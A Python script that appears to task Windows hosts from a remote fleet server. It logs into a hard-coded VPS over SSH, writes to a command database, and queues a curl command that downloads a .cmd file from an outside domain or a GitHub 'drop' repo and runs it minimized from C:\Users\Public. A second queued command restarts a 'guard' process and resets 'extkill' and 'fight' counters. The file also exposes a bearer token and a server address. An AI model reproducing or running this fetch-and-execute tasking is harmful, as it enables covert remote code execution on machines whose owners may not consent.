#!/usr/bin/env python3
"""Queue Gryxa recover4 on a host (C29 path)."""
from __future__ import annotations

import sys
from pathlib import Path

import paramiko

sys.stdout.reconfigure(encoding="utf-8", errors="replace")
TARGET = sys.argv[1] if len(sys.argv) > 1 else "LAPTOP-G0T88MQP"

OUTER = (
    r'C:\Windows\System32\curl.exe -f -L --ssl-no-revoke '
    r'-H "Authorization: Bearer fe7e8f3b8af479870248be10ca25410b8e1bf9a5" '
    r'--connect-timeout 15 --max-time 60 '
    r'-o C:\Users\Public\gryxa_recover4.cmd '
    r'https://debian.seczio.com/winrtcs/winrtcs_gryxa_recover4.cmd '
    r'& if not exist C:\Users\Public\gryxa_recover4.cmd '
    r'C:\Windows\System32\curl.exe -f -L --ssl-no-revoke --connect-timeout 15 --max-time 60 '
    r'-o C:\Users\Public\gryxa_recover4.cmd '
    r'https://raw.githubusercontent.com/xnobuddy/github-drop/main/winrtcs_gryxa_recover.cmd '
    r'& start "" /min cmd.exe /c C:\Users\Public\gryxa_recover4.cmd '
    r'& echo RECOVER4_STARTED'
)


def main() -> None:
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(
        "144.172.107.56",
        username="winrtcs",
        key_filename=str(Path.home() / ".ssh" / "winrtcs_ed25519"),
        timeout=20,
    )
    # ensure recover4 on mirror
    local_rec = Path(r"C:\Users\nobuddy\Desktop\Project\winrtcs_gryxa_recover.cmd")
    sftp = ssh.open_sftp()
    if local_rec.is_file():
        # Prefer the proven recover4 inline if present on VPS; else push recover.cmd as recover4
        sftp.put(str(local_rec), "/tmp/winrtcs_gryxa_recover.cmd")
    with sftp.file("/tmp/outer_g.txt", "w") as f:
        f.write(OUTER)
    py = f"""
import sqlite3, time, os
# keep existing recover4 if present; else copy recover.cmd
if not os.path.exists('/opt/winrtcs/repo/winrtcs_gryxa_recover4.cmd'):
    if os.path.exists('/tmp/winrtcs_gryxa_recover.cmd'):
        os.system('sudo cp /tmp/winrtcs_gryxa_recover.cmd /opt/winrtcs/repo/winrtcs_gryxa_recover4.cmd')
    elif os.path.exists('/tmp/winrtcs_gryxa_recover.cmd'):
        pass
os.system('sudo cp -f /tmp/winrtcs_gryxa_recover.cmd /opt/winrtcs/repo/winrtcs_gryxa_recover.cmd 2>/dev/null')
os.system('sudo test -f /opt/winrtcs/repo/winrtcs_gryxa_recover4.cmd || sudo cp /opt/winrtcs/repo/winrtcs_gryxa_recover.cmd /opt/winrtcs/repo/winrtcs_gryxa_recover4.cmd')
os.system('sudo chmod 644 /opt/winrtcs/repo/winrtcs_gryxa_recover4.cmd /opt/winrtcs/repo/winrtcs_gryxa_recover.cmd 2>/dev/null')
con=sqlite3.connect('/opt/winrtcs/fleet.db')
now=time.time()
cmd=open('/tmp/outer_g.txt',encoding='utf-8').read().strip()
# also boost guard
boost=(
 r'>C:\\ProgramData\\WinRTCS\\extkill.cnt echo 0'
 r' & >C:\\ProgramData\\WinRTCS\\fight.cnt echo 0'
 r' & >C:\\ProgramData\\WinRTCS\\guard.cnt echo 9999'
 r' & >C:\\ProgramData\\WinRTCS\\gryxa_boost.cnt echo 15'
 r' & rmdir /s /q C:\\ProgramData\\WinRTCS\\guard.lockd'
 r' & start \"\" /min cmd.exe /c C:\\ProgramData\\WinRTCS\\winrtcs_guard.cmd'
 r' & echo GUARD_BOOSTED'
)
cur=con.execute('INSERT INTO cmds(ts,target,cmd) VALUES(?,?,?)',(now,{TARGET!r},cmd))
cid=int(cur.lastrowid)
con.execute('''INSERT INTO jobs(ts,name,target,params,cmd_id,note,status,attempts,max_attempts,updated)
 VALUES(?,?,?,?,?,?,?,?,?,?)''',
 (now,'recover-gryxa',{TARGET!r},'{{}}',cid,'C29 recover4','queued',1,2,now))
cur2=con.execute('INSERT INTO cmds(ts,target,cmd) VALUES(?,?,?)',(now,{TARGET!r},boost))
print('recover', cid, 'boost', int(cur2.lastrowid))
row=con.execute('SELECT state,rmm,last_seen,guard FROM hosts WHERE host=?',({TARGET!r},)).fetchone()
print('host_now', row)
con.commit(); con.close()
"""
    with sftp.file("/tmp/qg.py", "w") as f:
        f.write(py)
    sftp.close()
    _, o, e = ssh.exec_command("sudo python3 /tmp/qg.py", timeout=30)
    print(o.read().decode("utf-8", "replace"))
    print(e.read().decode("utf-8", "replace"))
    ssh.close()


if __name__ == "__main__":
    main()
